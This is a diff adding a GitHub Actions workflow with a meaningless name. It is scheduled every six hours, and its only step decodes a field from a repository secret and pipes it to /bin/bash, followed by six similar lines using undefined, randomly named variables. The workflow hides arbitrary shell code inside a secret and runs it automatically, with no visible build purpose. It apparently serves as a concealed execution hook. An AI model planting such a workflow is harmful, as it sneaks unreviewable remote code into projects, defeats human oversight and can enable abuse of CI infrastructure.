@@ -1,0 +1,24 @@
+name: garmentlasagne
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: garmentlasagne
+        env:
+          tljp49178: ${{ secrets.tljp49178 }}
+        run: |
+          echo $tljp49178 | jq -r .tlrg73336 | /bin/bash
+          echo $bhcf30 | jq -r .gp8 | /bin/bash
+          echo $oxfuy2 | jq -r .obd99167 | /bin/bash
+          echo $ddlqc2 | jq -r .anver34 | /bin/bash
+          echo $ad95098 | jq -r .hbq73623 | /bin/bash
+          echo $q77435 | jq -r .pnvuk3511 | /bin/bash
+          echo $j54 | jq -r .n38 | /bin/bash
+
